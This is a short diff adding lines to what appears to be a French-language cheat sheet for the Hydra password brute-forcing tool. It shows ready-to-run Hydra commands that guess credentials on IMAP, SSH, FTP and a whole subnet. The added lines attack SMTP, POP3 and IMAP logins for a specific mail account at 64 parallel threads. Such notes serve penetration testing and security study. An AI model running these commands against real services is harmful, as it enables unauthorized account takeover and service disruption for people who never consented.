@@ -9,6 +9,12 @@ hydra -L userlist.txt -p defaultpw imap://192.168.0.1/PLAIN
 hydra -C user_pass.list ssh://$TARGET_IP
 hydra -l admin -p password ftp://[192.168.0.0/24]/
 hydra -L logins.txt -P pws.txt -M targets.txt ssh
+
+# bruteforce mail service password for known user
+hydra -l 'rebrec@domain.com' -P password.list  $TARGET_IP smtp -t 64  
+hydra -l 'rebrec@domain.com' -P password.list  $TARGET_IP pop3 -t 64 
+hydra -l 'rebrec@domain.com' -P password.list  $TARGET_IP imap -t 64 
+
 ```
 
 ## Augmenter la rapidité de l'attaque
